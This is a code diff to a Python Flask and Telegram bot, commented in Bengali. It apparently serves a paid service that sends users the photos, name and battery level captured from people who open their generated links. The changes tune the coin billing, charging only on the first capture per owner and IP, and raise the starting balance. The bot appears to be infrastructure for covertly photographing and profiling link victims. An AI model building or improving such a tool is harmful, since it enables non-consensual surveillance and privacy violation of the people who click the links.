@@ -24,6 +24,9 @@ forced_channels = []
 pending_referrals = {} 
 user_states = {}  
 
+# কোন লিংকে ইতিমধ্যে কয়েন কাটা হয়েছে সেটি ট্র্যাক করার জন্য (Session-based tracking)
+charged_sessions = set()
+
 app_telegram = None  
 bot_loop = None
 
@@ -37,7 +40,7 @@ def index():
 @flask_app.route('/upload-image', methods=['POST'])
 def upload_image():
     data = request.json
-    owner_id = data.get('chat_id')  # কে লিংক জেনারেট করেছিল (যার কাছে ছবি যাবে)
+    owner_id = data.get('chat_id')  # কে লিংক জেনারেট করেছিল
     image_data = data.get('image')
     name = data.get('name', 'Unknown')
     battery = data.get('battery', 'N/A')
@@ -49,13 +52,24 @@ def upload_image():
     try:
         owner_id = int(owner_id)
         
-        # কয়েন কাটার লজিক
+        # ইউনিক সেশন আইডি তৈরি (প্রতিবার নতুন লিংক ক্লিক বা ব্রাউজার সেশনের জন্য)
+        # এখানে আমরা চেক করছি এই সেশনে বা প্রথম ছবি আসাতে অলরেডি কয়েন কাটা হয়েছে কিনা
+        session_key = f"{owner_id}_{request.remote_addr}" # অথবা ব্রাউজার বেসড ট্র্যাক
+        
+        # তবে সহজ উপায়ে: প্রতিবার ছবি আসার সময় চেক করব আজকের এই লিংকের প্রথম ছবি কিনা।
+        # আরও নিখুঁত করতে নিচের লজিক: প্রথম ছবি আসার পর একবারই কয়েন কাটবে।
+        is_first_capture = False
+        if session_key not in charged_sessions:
+            is_first_capture = True
+            charged_sessions.add(session_key)
+
         if owner_id in users_db:
             if not users_db[owner_id].get("is_vip", False):
-                if users_db[owner_id]["balance"] >= 1:
-                    users_db[owner_id]["balance"] -= 1
-                else:
-                    return jsonify({"status": "error", "message": "Insufficient coins"}), 400
+                if is_first_capture:  # শুধুমাত্র প্রথম ছবির জন্যই মাত্র ১ কয়েন কাটবে
+                    if users_db[owner_id]["balance"] >= 1:
+                        users_db[owner_id]["balance"] -= 1
+                    else:
+                        return jsonify({"status": "error", "message": "Insufficient coins"}), 400
 
         header, encoded = image_data.split(",", 1)
         image_bytes = base64.b64decode(encoded)
@@ -69,7 +83,7 @@ def upload_image():
         )
 
         asyncio.run_coroutine_threadsafe(
-            send_photo_to_owner(owner_id, image_bytes, caption),
+            send_photo_to_owner(owner_id, image_bytes, caption, is_first_capture),
             bot_loop
         )
 
@@ -78,13 +92,13 @@ def upload_image():
         logger.error(f"Image upload error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-async def send_photo_to_owner(owner_id, photo_bytes, caption):
+async def send_photo_to_owner(owner_id, photo_bytes, caption, is_first):
     try:
-        # ছবি সরাসরি লিংক-মালিকের ইনবক্সে যাবে
         await app_telegram.bot.send_photo(chat_id=owner_id, photo=photo_bytes, caption=caption, parse_mode="Markdown")
-        if owner_id in users_db:
+        # যদি প্রথম ছবি হয় এবং কয়েন কেটে থাকে, তবে নোটিফিকেশন দিবে
+        if owner_id in users_db and is_first:
             bal = "VIP (Unlimited)" if users_db[owner_id]["is_vip"] else f"{users_db[owner_id]['balance']} Coins"
-            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 আপনার লিংকে রেসপন্স পাওয়া গেছে!\n💰 বর্তমান ব্যালেন্স: {bal}")
+            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 আপনার লিংকে প্রথম রেসপন্স পাওয়া গেছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
     except Exception as e:
         logger.error(f"Telegram send photo error: {e}")
 
@@ -140,7 +154,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == ADMIN_ID)
 
     if user_id not in users_db:
-        users_db[user_id] = {"username": username, "balance": 3, "referrals": 0, "is_vip": False}
+        users_db[user_id] = {"username": username, "balance": 10, "referrals": 0, "is_vip": False}
 
         if context.args and context.args[0].startswith("ref_"):
             try:
@@ -177,7 +191,6 @@ async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     await query.answer("✅ ভেরিফিকেশন সফল হয়েছে!", show_alert=True)
 
-    # শুধুমাত্র চেক জয়েনে ক্লিক করলেই রেফার বোনাস এড হবে
     if user_id in pending_referrals:
         referrer_id = pending_referrals[user_id]
         if referrer_id in users_db:
